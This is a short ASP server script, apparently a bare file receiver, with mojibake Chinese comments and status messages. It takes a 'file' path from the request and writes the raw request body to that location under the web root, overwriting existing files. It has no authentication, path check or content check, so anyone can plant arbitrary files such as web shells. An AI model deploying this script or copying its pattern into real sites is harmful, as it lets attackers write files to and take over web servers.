<%'ASP�ļ����ճ���
dim file,obj,fso
file = Trim(Request("file"))
If file = "" Then Response.Write "�ϴ������ļ���δָ��": Response.End
Set obj = Server.CreateObject("Adodb.Stream")
With obj
.Type = 1
.Mode = 3
.Open
.Write Request.BinaryRead(Request.TotalBytes)
.Position = 0
.SaveToFile Server.Mappath(file), 2
.Close
End With
Set obj = Nothing
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(Server.Mappath(file)) Then
Response.Write "�ϴ��ɹ�"
Else
Response.Write "�ϴ�ʧ��"
End If
Set fso = Nothing
%>